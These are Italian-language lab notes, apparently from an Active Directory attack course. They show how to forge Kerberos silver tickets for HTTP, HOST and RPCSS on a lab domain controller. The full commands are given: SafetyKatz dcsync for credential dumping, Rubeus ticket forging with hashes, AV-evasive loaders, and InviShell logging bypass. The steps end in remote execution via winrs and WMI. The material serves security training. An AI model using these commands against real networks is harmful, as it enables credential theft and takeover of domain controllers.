# LEARNING OBJECTIVE9

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

• During the additional lab time:\
• Try to get command execution on the domain controller by creating\
silver tickets for:\
– HTTP\
– WMI

### SVOLGIMENTO

Dalle informazioni raccolte nei passaggi precedenti abbiamo ottenuto l'hash per l'account macchina del controller di dominio (dcorp-dc$). Si noti che qui NON stiamo utilizzando l'hash krbtgt. Utilizzando il comando riportato di seguito, possiamo creare un Silver Ticket che ci consente di accedere al servizio HTTP (WinRM) su DC.

Per recuperare NTLM hash del host dcorp-dc$ qualora lo avessimo perso, eseguire il seguente comando

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A questo punto siamo pronti a forgiare il Silver Ticket

Spawnare un prompt con svcadmin (Facoltativo e' sufficiente un prompt amministrativo, run as administrator)

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### HTTP Service - Silver Ticket

Nel nuovo prompt possiamo eseguire Rubeus usando Loader per la creazione del Silver-Ticket per  l'acoount host dcorp-dc$

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:922dbee7f8548b8a2dc279d0c47d8d1c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Per verificare che il silver ticket sia nella nostra klist eseguiamo

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A questo punto accediamo dcorp-dc usando il FQDN visto che il ticket e' stato forgiato usando l'FQDN dcorp-dc.dollarcorp.moneycorp.local usando winrs&#x20;

```powershell
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```

```
set computername
```

```
set username
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### WMI Service - Silver Ticket

Per accedere a WMI, è necessario creare due ticket: uno per il servizio HOST e un altro per RPCSS. Eseguire i comandi seguenti da una shell con privilegi elevati:

Host Ticket

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:922dbee7f8548b8a2dc279d0c47d8d1c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

RPCSS TICKET

```powershell
>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:922dbee7f8548b8a2dc279d0c47d8d1c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Adesso eseguiamo InviShell con <kbd>RunWithRegistryNoAdmin.bat</kbd>

```powershell
RunWithRegistryNonAdmin.bat
```

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Proviamo ad eseguire comandi WMI

```powershell
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
